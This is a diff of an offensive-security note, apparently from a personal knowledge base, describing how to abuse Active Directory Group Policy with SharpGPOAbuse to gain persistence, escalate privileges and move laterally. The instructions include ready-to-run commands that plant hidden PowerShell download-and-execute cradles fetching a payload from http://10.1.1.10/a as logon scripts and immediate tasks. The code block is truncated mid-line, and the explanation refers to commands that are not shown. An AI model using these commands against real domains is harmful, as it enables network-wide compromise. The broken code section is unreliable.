@@ -28,11 +28,15 @@ From a technical perspective, SharpGPOAbuse works by creating a new Group Policy
 
 The business value of using SharpGPOAbuse is that it allows an attacker to gain persistent access to a network, escalate privileges, and move laterally within the network undetected.
 
+ 
+
 ## Requirements
 
 1. Administrative access to a domain controller
 
 1. Access to a domain administrator account
+
+ 
 
 ## Defense
 
@@ -42,6 +46,8 @@ The business value of using SharpGPOAbuse is that it allows an attacker to gain 
 
 1. Regularly review and audit Group Policy Objects for unauthorized modifications
 
+ 
+
 ## Objectives
 
 1. Gain persistent access to a target network
@@ -49,6 +55,8 @@ The business value of using SharpGPOAbuse is that it allows an attacker to gain 
 1. Escalate privileges within the target network
 
 1. Move laterally within the target network
+
+ 
 
 # Instructions
 
@@ -61,8 +69,14 @@ The business value of using SharpGPOAbuse is that it allows an attacker to gain 
 6. To configure a user or computer logon script, run the command '.\SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"'
 7. To configure a computer or user immediate task, run the command '.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"'
 
+ 
+
+
+
 **Code**: [[# Build and configure SharpGPOAbuse
 $ git clone ht]]
+
+
 
 > This command is used to configure SharpGPOAbuse, a tool used for exploiting Group Policy Objects (GPOs) in Active Directory environments. The 'git clone' command is used to clone the SharpGPOAbuse repository, while the 'Install-Package' command is used to install the CommandLineParser package. The 'ILMerge' command is used to merge the SharpGPOAbuse.exe and CommandLine.dll files into a single executable. The remaining commands are used to add user rights, add a local admin, configure a user or computer logon script, and configure a computer or user immediate task. The 'TaskName' argument specifies the name of the task, while the 'Author' argument specifies the author of the task. The 'Command' argument specifies the command to be executed, while the 'Arguments' argument specifies the arguments to be passed to the command. The 'GPOName' argument specifies the name of the GPO to which the configuration should be applied.
 
@@ -71,3 +85,5 @@ $ git clone ht]]
 - [[Abuse GPO with SharpGPOAbuse]]
 - [[Active Directory Attacks]]
 - [[Exploit Group Policy Objects GPO]]
+
+
